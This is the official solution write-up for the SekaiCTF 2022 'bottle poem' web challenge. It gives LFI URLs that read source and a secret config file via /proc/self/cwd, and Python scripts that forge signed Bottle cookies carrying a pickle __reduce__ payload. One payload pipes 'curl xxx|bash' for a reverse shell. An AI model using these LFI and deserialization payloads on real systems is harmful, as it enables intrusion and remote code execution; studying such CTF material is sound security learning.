---
title: "bottle poem - sekaictf 2022"
category: "web"
subcategory: "lattice"
type: "writeup"
tags: ["web", "lll", "lfi", "deserialization", "pickle", "base64", "reverse-shell"]
summary: "It's easy to find that this website has LFI."
source:
  name: "project-sekai-ctf/sekaictf-2022"
  url: "https://github.com/project-sekai-ctf/sekaictf-2022/blob/383b16da68c438c5d516e6f00b2716210141f7a4/web/bottle-poem/solution/README.md"
ctf:
  name: "sekaictf"
  year: 2022
  challenge: "bottle poem"
---

## Source

- **CTF:** sekaictf 2022
- **Challenge:** bottle poem
- **Repository:** [project-sekai-ctf/sekaictf-2022](https://github.com/project-sekai-ctf/sekaictf-2022)
- **File:** <https://github.com/project-sekai-ctf/sekaictf-2022/blob/383b16da68c438c5d516e6f00b2716210141f7a4/web/bottle-poem/solution/README.md>

---
# Writeup

It's easy to find that this website has LFI. If you want to read file directly but failed, that does not mean we tried to hide the flag file, it means you don't have enough execute permission to read it. Since there were many tickets about it, we later updated description that flag is an executable on server, and you don't need to bruteforce or guess anything. Flag is in the common path `./flag`.

So we need to read source, just like this:

http://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/app.py

And we don't need to bruteforce `proc/self/`, just use it to got sourcecode.

Use this way you can read the secret `--sekai`

http://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py

Now you can control the cookies, but if you read something just like `/views/admin.html` or just make guest to admin you would find it's a troll. You need RCE truely, and if you search some documentation you will find the bottle's `cookie_decode()` will unpickle. So we use this to get RCE.

https://github.com/bottlepy/bottle/issues/900

Here are the steps
1. lfi to read file and	secret
2. use cookie pickle rce to reverse a shell
3. execute ./flag to get flag

Demo exploit: 

```py
import base64,hashlib,pickle,hmac
import os
def tob(s, enc='utf8'):
    if isinstance(s, str):
        return s.encode(enc)
    return b'' if s is None else bytes(s)
def cookie_encode(data, key):
    ''' Encode and sign a pickle-able object. Return a (byte) string '''
    msg = base64.b64encode(pickle.dumps(data, 0))
    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())
    return tob('!') + sig + tob('?') + msg
class test():
    def __reduce__(self):
        return (eval,('__import__("os").popen("command")',))
obj = test()
a = cookie_encode(obj,'Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu')
print(a)
```

Or you can just use bottle's cookie encode

**Notice:** You need reverse shell 

```python
import bottle
import requests
url='http://bottle-poem.ctf.sekai.team/sign'
secret = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
class Exploit:
    def __reduce__(self):
        return (eval, ('__import__("os").popen("curl xxx|bash")',))
exp = bottle.cookie_encode(
    ('session', {"name": [Exploit()]}),
    secret
)
print(exp)
```

Will remove pickle to decode and instead of json.

This is a basic lfi to rce, but seems a little too hard for new CTF players (due to the new trick). I will make an easier challenge next year :)
